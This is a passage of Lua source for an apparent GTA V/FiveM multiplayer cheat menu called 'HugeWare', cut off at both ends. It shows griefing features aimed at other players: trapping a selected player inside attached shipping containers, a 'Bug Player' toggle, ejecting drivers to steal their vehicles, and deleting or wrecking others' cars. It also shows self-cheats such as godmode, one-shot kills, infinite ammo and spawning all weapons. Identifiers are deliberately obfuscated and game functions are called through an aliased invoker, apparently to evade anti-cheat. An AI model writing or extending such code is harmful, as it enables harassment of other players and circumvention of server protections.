                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                2.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            --                                      TOP RIGHT L
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                11.2,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(20)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                14,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                6.4,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                9.6,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            --                                      MIDDLE LEFT UP
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                0,
                8.4,
                0,
                90,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -3.2,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(20)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                11.2,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                14,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(20)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                -6.4,
                16.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            --                                      MIDDLE RIGHT DOWN
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                6.4,
                8.4,
                0,
                90,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                9.6,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                5.6,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                2.8,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                12.8,
                0,
                0,
                90,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            --                                      CENTER BLOCK
            Citizen.Wait(50)
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                8.4,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
            AttachEntityToEntity(
                CreateObject(GetHashKey("prop_container_ld_pu"), 0, 0, 0, true, true, true),
                GetPlayerPed(SelectedPlayer),
                GetPedBoneIndex(GetPlayerPed(SelectedPlayer), 0),
                0,
                3.2,
                14.0,
                90,
                0,
                0,
                true,
                true,
                false,
                true,
                1,
                true
            )
        end

        if SlimCheckbox("Dildo rain", 0.534, 0.55, 0.55, HugeV.locals.DildoRain) then
            HugeV.locals.DildoRain = not HugeV.locals.DildoRain
        end

        ----------------------------------------------------------------------------------------------------

        --[[if SlimButton_antekr5("Kill Player", false, 0.525, 0.53) then
						for i_didsfyg98sduriesdfg = 0, 150 do
							TazePlayer_GUI_HugeV(HugeV.locals.SelectedPlayer)
						end
					end]]
        if SlimCheckbox("Bug Player", 0.534, 0.53, 0.53, HugeV.locals.BugPlayer) then
            HugeV.locals.BugPlayer = not HugeV.locals.BugPlayer
        end

        if IsDisabledControlPressed(0, 14) then
            if 11 >= #HugeV.locals.ids then
                HugeV.locals.scrool = HugeV.locals.scrool
            else
                if HugeV.locals.scrool + 2 >= #HugeV.locals.ids then
                    HugeV.locals.scrool = #HugeV.locals.ids
                else
                    HugeV.locals.scrool = HugeV.locals.scrool + 2
                end
            end
        end
        if IsDisabledControlPressed(0, 15) then
            if HugeV.locals.scrool - 2 <= 11 then
                HugeV.locals.scrool = 11
            else
                HugeV.locals.scrool = HugeV.locals.scrool - 2
            end
        end
        if #HugeV.locals.ids <= 10 then
            for i = 1 + (HugeV.locals.scrool - 11), HugeV.locals.scrool - 11 + #HugeV.locals.ids do
                local player = GetPlayerName(HugeV.locals.ids[i])
                if
                    OnlineButton(
                        GetPlayerServerId(HugeV.locals.ids[i]),
                        player,
                        false,
                        0.4,
                        0.495 + (0.019 * (i - HugeV.locals.scrool))
                    )
                 then
                    HugeV.locals.SelectedPlayer = HugeV.locals.ids[i]
                end
            end
        else
            for i = 1 + (HugeV.locals.scrool - 11), HugeV.locals.scrool do
                local player = GetPlayerName(HugeV.locals.ids[i])
                if
                    OnlineButton(
                        GetPlayerServerId(HugeV.locals.ids[i]),
                        player,
                        false,
                        0.4,
                        0.495 + (0.019 * (i - HugeV.locals.scrool))
                    )
                 then
                    HugeV.locals.SelectedPlayer = HugeV.locals.ids[i]
                end
            end
        end
    elseif HugeV.locals.current_tab == "Vehicle" then
        if MenuButton_czlowiek_DS_2("Vehicle Options", false, 0.35, 0.27) then
            HugeV.locals.selected2 = "Vehicle Options"
        end

        if MenuButton_czlowiek_DS_2("Radar", false, 0.395, 0.27) then
            HugeV.locals.selected2 = "Radar"
        end

        if HugeV.locals.selected2 == "Radar" then
            if HugeV.locals.SelectedVehicle ~= 0 then
                if GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.SelectedVehicle)) == "CARNOTFOUND" then
                    HugeV.locals.SelectedVehicle = HugeV.locals.vehicles[1]
                end
                if
                    #HugeV.locals.vehicles == 1 and
                        GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.vehicles[i]))
                 then
                    onlineplayers_jgithjtrl(
                        "Vehicles in area: " .. #HugeV.locals.vehicles - 1,
                        false,
                        0.33,
                        4,
                        0.356,
                        0.29
                    )
                else
                    onlineplayers_jgithjtrl("Vehicles in area: " .. #HugeV.locals.vehicles, false, 0.33, 4, 0.356, 0.29)
                end
                onlineplayers_jgithjtrl("Selected vehicle Informations", false, 0.33, 4, 0.49, 0.32)
                onlineplayers_jgithjtrl(
                    "Vehicle: " ..
                        string.upper(GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.SelectedVehicle))) ..
                            " (ID: " .. HugeV.locals.SelectedVehicle .. ")",
                    false,
                    0.33,
                    4,
                    0.49,
                    0.35
                )
                onlineplayers_jgithjtrl(
                    "Distance: " ..
                        math.round(
                            GetDistanceBetweenCoords(
                                HugeV.functions.getEntityCoords(HugeV.Player.PedId),
                                HugeV.functions.getEntityCoords(HugeV.locals.SelectedVehicle),
                                true
                            ),
                            1
                        ) ..
                            "m",
                    false,
                    0.33,
                    4,
                    0.49,
                    0.38
                )
                onlineplayers_jgithjtrl(
                    "Health: " .. GetEntityHealth(HugeV.locals.SelectedVehicle),
                    false,
                    0.33,
                    4,
                    0.49,
                    0.41
                )
                if SlimCheckbox("Cam In Veh", 0.50, 0.45, 0.45, HugeV.locals.CamInVeh) then
                    if HugeV.locals.Freecam then
                        HugeV.locals.Freecam = false
                    end

                    if HugeV.locals.Spectate then
                        HugeV.locals.Spectate = false
                    end
                    z_CamInVeh_DSIGHIDS = 0.0
                    HugeV.locals.CamInVeh = not HugeV.locals.CamInVeh
                end
                DrawRect(
                    0.42,
                    0.42,
                    0.13,
                    0.2,
                    HugeV.menu_color.HugeWare_pw.r,
                    HugeV.menu_color.HugeWare_pw.g,
                    HugeV.menu_color.HugeWare_pw.b,
                    150
                )
            else
                if
                    #HugeV.locals.vehicles == 1 and
                        GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.vehicles[i]))
                 then
                    onlineplayers_jgithjtrl(
                        "Vehicles in area: " .. #HugeV.locals.vehicles - 1,
                        false,
                        0.33,
                        4,
                        0.356,
                        0.29
                    )
                else
                    onlineplayers_jgithjtrl("Vehicles in area: " .. #HugeV.locals.vehicles, false, 0.33, 4, 0.356, 0.29)
                end
                onlineplayers_jgithjtrl("You didnt selected any vehicle", false, 0.33, 4, 0.49, 0.32)
                DrawRect(
                    0.42,
                    0.42,
                    0.13,
                    0.2,
                    HugeV.menu_color.HugeWare_pw.r,
                    HugeV.menu_color.HugeWare_pw.g,
                    HugeV.menu_color.HugeWare_pw.b,
                    150
                )
            end

            if SlimButton_antekr5("Teleport to Vehicle", false, 0.355, 0.54) then
                local entityfdhudfkidfh =
                    Czitirzen_InvokeNative(0x997ABD671D25CA0B, Czitirzen_InvokeNative(0xD80958FC74E988A6), false) and
                    Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6)) or
                    Czitirzen_InvokeNative(0xD80958FC74E988A6)
                Czitirzen_InvokeNative(
                    0x06843DA7060A026B,
                    entityfdhudfkidfh,
                    GetEntityCoords(HugeV.locals.SelectedVehicle),
                    0.0,
                    0.0,
                    0.0,
                    false
                )
            end

            if SlimButton_antekr5("Warp Vehicle", false, 0.355, 0.56) then
                local vehicle_UDHUHDFSGDFG = HugeV.locals.SelectedVehicle
                local free_seat_IDYGIUFGDFG = false
                local ped_to_kick = GetPedInVehicleSeat(vehicle_UDHUHDFSGDFG, -1)
                if vehicle_UDHUHDFSGDFG ~= 0 then
                    if ped_to_kick ~= 0 then
                        Citizen.Wait(10)
                        while not free_seat_IDYGIUFGDFG do
                            Czitirzen_InvokeNative(0xAAA34F8A7CB32098, ped_to_kick)
                            if IsVehicleSeatFree(vehicle_UDHUHDFSGDFG, -1) then
                                free_seat_IDYGIUFGDFG = true
                                Czitirzen_InvokeNative(
                                    0xF75B0D629E1C063D,
                                    Czitirzen_InvokeNative(0xD80958FC74E988A6),
                                    vehicle_UDHUHDFSGDFG,
                                    -1
                                )
                                break
                            else
                                Citizen.Wait(0)
                            end
                        end
                    else
                        Czitirzen_InvokeNative(
                            0xF75B0D629E1C063D,
                            Czitirzen_InvokeNative(0xD80958FC74E988A6),
                            vehicle_UDHUHDFSGDFG,
                            -1
                        )
                    end
                end
            end

            if SlimButton_antekr5("Delete Vehicle", false, 0.355, 0.58) then
                local vehicle_dugshisdfg = HugeV.locals.SelectedVehicle
                if vehicle_dugshisdfg then
                    Czitirzen_InvokeNative(0xAD738C3085FE7E11, vehicle_dugshisdfg, true, true)
                    Czitirzen_InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(vehicle_dugshisdfg))
                end
            end

            if SlimButton_antekr5("Repair Vehicle", false, 0.355, 0.6) then
                Czitirzen_InvokeNative(0x115722B1B9C14C1C, HugeV.locals.SelectedVehicle)
                Czitirzen_InvokeNative(0x79D3B596FE44EE8B, HugeV.locals.SelectedVehicle, 0.0)
                Czitirzen_InvokeNative(0x34E710FF01247C5A, HugeV.locals.SelectedVehicle, 0)
                Czitirzen_InvokeNative(0xFB8794444A7D60FB, HugeV.locals.SelectedVehicle, false)
                Czitirzen_InvokeNative(0x1FD09E7390A74D54, HugeV.locals.SelectedVehicle, 0)
            end

            if SlimButton_antekr5("Destroy Vehicle", false, 0.355, 0.62) then
                NetworkRequestControlOfEntity(HugeV.locals.SelectedVehicle)
                StartVehicleAlarm(HugeV.locals.SelectedVehicle)
                DetachVehicleWindscreen(HugeV.locals.SelectedVehicle)
                SmashVehicleWindow(HugeV.locals.SelectedVehicle, 0)
                SmashVehicleWindow(HugeV.locals.SelectedVehicle, 1)
                SmashVehicleWindow(HugeV.locals.SelectedVehicle, 2)
                SmashVehicleWindow(HugeV.locals.SelectedVehicle, 3)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 0, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 1, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 2, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 3, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 4, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 5, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 4, true, 1000.0)
                SetVehicleTyreBurst(HugeV.locals.SelectedVehicle, 7, true, 1000.0)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 0, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 1, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 2, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 3, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 4, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 5, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 6, true)
                SetVehicleDoorBroken(HugeV.locals.SelectedVehicle, 7, true)
                SetVehicleLights(HugeV.locals.SelectedVehicle, 1)
                Czitirzen_InvokeNative(0x1FD09E7390A74D54, HugeV.locals.SelectedVehicle, 1)
                SetVehicleNumberPlateTextIndex(HugeV.locals.SelectedVehicle, 5)
                SetVehicleNumberPlateText(HugeV.locals.SelectedVehicle, "HUGEWARE")
                SetVehicleDirtLevel(HugeV.locals.SelectedVehicle, 10.0)
                SetVehicleModColor_1(HugeV.locals.SelectedVehicle, 1)
                SetVehicleModColor_2(HugeV.locals.SelectedVehicle, 1)
                SetVehicleCustomPrimaryColour(HugeV.locals.SelectedVehicle, 0, 0, 255)
                SetVehicleCustomSecondaryColour(HugeV.locals.SelectedVehicle, 0, 0, 255)
                SetVehicleBurnout(HugeV.locals.SelectedVehicle, true)
            end

            if SlimButton_antekr5("Turn Off Engine", false, 0.355, 0.64) then
                NetworkRequestControlOfEntity(HugeV.locals.SelectedVehicle)
                SetVehicleEngineOn(HugeV.locals.SelectedVehicle, false, true, true)
            end

            if SlimButton_antekr5("Turn On Engine", false, 0.355, 0.66) then
                NetworkRequestControlOfEntity(HugeV.locals.SelectedVehicle)
                SetVehicleEngineOn(HugeV.locals.SelectedVehicle, true, true, true)
            end

            if IsDisabledControlPressed(0, 14) then
                if 11 >= #HugeV.locals.vehicles then
                    HugeV.locals.scrool_vehicles = HugeV.locals.scrool_vehicles
                else
                    if HugeV.locals.scrool_vehicles + 2 >= #HugeV.locals.vehicles then
                        HugeV.locals.scrool_vehicles = #HugeV.locals.vehicles
                    else
                        HugeV.locals.scrool_vehicles = HugeV.locals.scrool_vehicles + 2
                    end
                end
            end
            if IsDisabledControlPressed(0, 15) then
                if HugeV.locals.scrool_vehicles - 2 <= 11 then
                    HugeV.locals.scrool_vehicles = 11
                else
                    HugeV.locals.scrool_vehicles = HugeV.locals.scrool_vehicles - 2
                end
            end
            if #HugeV.locals.vehicles == 1 and GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.vehicles[i])) then
            else
                if #HugeV.locals.vehicles <= 10 then
                    for i = 1 + (HugeV.locals.scrool_vehicles - 11), HugeV.locals.scrool_vehicles - 11 +
                        #HugeV.locals.vehicles do
                        local name = GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.vehicles[i]))
                        if
                            VehicleButton(
                                GetVehicleNumberPlateText(HugeV.locals.vehicles[i]),
                                name,
                                false,
                                0.4,
                                0.515 + (0.019 * (i - HugeV.locals.scrool_vehicles)),
                                HugeV.locals.vehicles[i]
                            )
                         then
                            HugeV.locals.SelectedVehicle = HugeV.locals.vehicles[i]
                        end
                    end
                else
                    for i = 1 + (HugeV.locals.scrool_vehicles - 11), HugeV.locals.scrool_vehicles do
                        local name = GetDisplayNameFromVehicleModel(GetEntityModel(HugeV.locals.vehicles[i]))
                        if
                            VehicleButton(
                                GetVehicleNumberPlateText(HugeV.locals.vehicles[i]),
                                name,
                                false,
                                0.4,
                                0.515 + (0.019 * (i - HugeV.locals.scrool_vehicles)),
                                HugeV.locals.vehicles[i]
                            )
                         then
                            HugeV.locals.SelectedVehicle = HugeV.locals.vehicles[i]
                        end
                    end
                end
            end
        end

        if HugeV.locals.selected2 == "Vehicle Options" then
            if SlimCheckbox("Speed Boost", 0.36, 0.3, 0.3, HugeV.locals.VehBoost) then
                if HugeV.locals.Safemode then
                    Citizen.InvokeNative(
                        0x67C540AA08E4A6F5,
                        -1,
                        "Hack_Failed",
                        "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                        true
                    )
                    DebugPrint("Safe mode is currently on.", "INFO")
                else
                    HugeV.locals.VehBoost = not HugeV.locals.VehBoost
                end
            end

            if SlimCheckbox("Vehicle Godmode", 0.36, 0.32, 0.32, HugeV.locals.VehGod) then
                if HugeV.locals.Safemode then
                    Citizen.InvokeNative(
                        0x67C540AA08E4A6F5,
                        -1,
                        "Hack_Failed",
                        "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                        true
                    )
                    DebugPrint("Safe mode is currently on.", "INFO")
                else
                    HugeV.locals.VehGod = not HugeV.locals.VehGod
                end
            end

            if SlimCheckbox("Spawn In Veh", 0.36, 0.34, 0.34, Spawn_In_Veh_UHUDGFDGDF) then
                Spawn_In_Veh_UHUDGFDGDF = not Spawn_In_Veh_UHUDGFDGDF
            end

            if SlimCheckbox("Vehicle Bunnyhop", 0.36, 0.36, 0.36, HugeV.locals.JumpMod) then
                HugeV.locals.JumpMod = not HugeV.locals.JumpMod
            end
            if SlimCheckbox("No Gravity", 0.36, 0.38, 0.38, NoVehicleGravity) then
                NoVehicleGravity = not NoVehicleGravity
            end

            if SlimButton_antekr5("Spawn Custom Car", false, 0.35, 0.4) then
                local ModelName_fuhgs8ordhfdsfg = KeyBoardInput_jdhgijslrgeg("Type a name of vehicle", "", 100)
                local autko_dihgs8oregsfdg = Czitirzen_InvokeNative(0xD24D37CC275948CC, ModelName_fuhgs8ordhfdsfg)
                if
                    ModelName_fuhgs8ordhfdsfg and Czitirzen_InvokeNative(0xC0296A2EDF545E92, autko_dihgs8oregsfdg) and
                        Czitirzen_InvokeNative(0x19AAC8F07BFEC53E, autko_dihgs8oregsfdg)
                 then
                    RequestModelSync_SDUFHSIDGSDG(autko_dihgs8oregsfdg)

                    if Delete_Current_Vehicle_DSIGHDSIUGSDG then
                        local veh_DSGUHSDIUGSDUGSDGSDG =
                            GetVehiclePedIsIn(Czitirzen_InvokeNative(0xD80958FC74E988A6), 0)
                        Czitirzen_InvokeNative(
                            0xEA386986E786A54F,
                            Citizen.PointerValueIntInitialized(veh_DSGUHSDIUGSDUGSDGSDG)
                        )
                    end

                    local veh_duhgs8uoiregfdg =
                        Czitirzen_InvokeNative(
                        0xAF35D0D2583051B0,
                        Czitirzen_InvokeNative(0xD24D37CC275948CC, ModelName_fuhgs8ordhfdsfg),
                        GetEntityCoords(Czitirzen_InvokeNative(0xD80958FC74E988A6)),
                        Czitirzen_InvokeNative(0xE83D4F9BA2A38914, Czitirzen_InvokeNative(0xD80958FC74E988A6)),
                        true,
                        true
                    )
                    if Spawn_In_Veh_UHUDGFDGDF then
                        Czitirzen_InvokeNative(
                            0xF75B0D629E1C063D,
                            Czitirzen_InvokeNative(0xD80958FC74E988A6),
                            veh_duhgs8uoiregfdg,
                            -1
                        )
                    end
                else
                    DebugPrint("Model Not Found!", "ERROR")
                end
            end
            if SlimButton_antekr5("Repair", false, 0.35, 0.42) then
                Czitirzen_InvokeNative(
                    0x115722B1B9C14C1C,
                    Czitirzen_InvokeNative(0x9A9112A0FE9A4713, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false)
                )
                Czitirzen_InvokeNative(
                    0x79D3B596FE44EE8B,
                    Czitirzen_InvokeNative(0x9A9112A0FE9A4713, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    0.0
                )
                Czitirzen_InvokeNative(
                    0x34E710FF01247C5A,
                    Czitirzen_InvokeNative(0x9A9112A0FE9A4713, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    0
                )
                Czitirzen_InvokeNative(
                    0xFB8794444A7D60FB,
                    Czitirzen_InvokeNative(0x9A9112A0FE9A4713, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    false
                )
                Czitirzen_InvokeNative(
                    0x1FD09E7390A74D54,
                    Czitirzen_InvokeNative(0x9A9112A0FE9A4713, Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    0
                )
            end
            if SlimButton_antekr5("Repair Engine", false, 0.35, 0.44) then
                Czitirzen_InvokeNative(
                    0x45F6D8EEF34ABEF1,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1)),
                    10000
                )
                Czitirzen_InvokeNative(
                    0x1FD09E7390A74D54,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1), false),
                    0
                )
                Czitirzen_InvokeNative(
                    0x8ABA6AF54B942B95,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1)),
                    false
                )
                Czitirzen_InvokeNative(
                    0xFB8794444A7D60FB,
                    GetVehiclePedIsIn(Czitirzen_InvokeNative(0x43A66C31C68491C0, -1)),
                    false
                )
            end
            if SlimButton_antekr5("Flip current vehicle", false, 0.35, 0.46) then
                local vehicle_dugshisdfg =
                    Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6))
                Czitirzen_InvokeNative(0x49733E92263139D1, vehicle_dugshisdfg)
            end
            if SlimButton_antekr5("Delete current vehicle", false, 0.35, 0.48) then
                local vehicle_dugshisdfg =
                    Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6))
                if vehicle_dugshisdfg then
                    Czitirzen_InvokeNative(0xAD738C3085FE7E11, vehicle_dugshisdfg, true, true)
                    Czitirzen_InvokeNative(0xEA386986E786A54F, Citizen.PointerValueIntInitialized(vehicle_dugshisdfg))
                end
            end
            if SlimButton_antekr5("Max Tuning", false, 0.35, 0.5) then
                local vehicle_dugshisdfg =
                    Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6))
                full_tuning_dugisdgdsfgidf(vehicle_dugshisdfg)
            end
            if SlimButton_antekr5("Max Mechanics", false, 0.35, 0.52) then
                local vehicle_dugshisdfg =
                    Czitirzen_InvokeNative(0x6094AD011A2EA87D, Czitirzen_InvokeNative(0xD80958FC74E988A6))
                full_tuning_pref_dugisdgdsfgidf(vehicle_dugshisdfg)
            end
        end
    elseif HugeV.locals.current_tab == "Weapon" then
        if SlimCheckbox("Oneshot", 0.36, 0.27, 0.27, HugeV.locals.OneShot) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.OneShot = not HugeV.locals.OneShot
            end
        end
        if SlimCheckbox("Infinite Ammo", 0.36, 0.29, 0.29, HugeV.locals.InfinityAmmo) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.InfinityAmmo = not HugeV.locals.InfinityAmmo
            end
        end
        if SlimCheckbox("Cat Gun", 0.36, 0.31, 0.31, HugeV.locals.catgun) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.catgun = not HugeV.locals.catgun
            end
        end
        if SlimCheckbox("Fire Gun", 0.36, 0.33, 0.33, HugeV.locals.eGun) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                HugeV.locals.eGun = not HugeV.locals.eGun
            end
        end
        if SlimButton_antekr5("Give All Weapons", false, 0.35, 0.35) then
            if HugeV.locals.Safemode then
                Citizen.InvokeNative(
                    0x67C540AA08E4A6F5,
                    -1,
                    "Hack_Failed",
                    "DLC_HEIST_BIOLAB_PREP_HACKING_SOUNDS",
                    true
                )
                DebugPrint("Safe mode is currently on.", "INFO")
            else
                for i_didsfyg98sduriesdfg = 1, #HugeV.locals.AllGuns do
                    Czitirzen_InvokeNative(
                        0xBF0FD6E56C964FCB,
                        Czitirzen_InvokeNative(0xD80958FC74E988A6),
                        Czitirzen_InvokeNative(
                            0xD24D37CC275948CC,
                            "WEAPON_" .. HugeV.locals.AllGuns[i_didsfyg98sduriesdfg]
                        ),
                        1000,
                        false,
                        false
                    )
                end
            end
        end
        if SlimButton_antekr5("Remove All Weapons", false, 0.35, 0.37) then
            for i_didsfyg98sduriesdfg = 1, #HugeV.locals.AllGuns do
                Czitirzen_InvokeNative(
                    0x4899CB088EDF59B8,
                    Czitirzen_InvokeNative(0xD80958FC74E988A6),
                    Czitirzen_InvokeNative(0xD24D37CC275948CC, "WEAPON_" .. HugeV.locals.AllGuns[i_didsfyg98sduriesdfg])
                )
            end
        end
        if SlimButton_antekr5("Give Custom Weapon", false, 0.35, 0.39) then
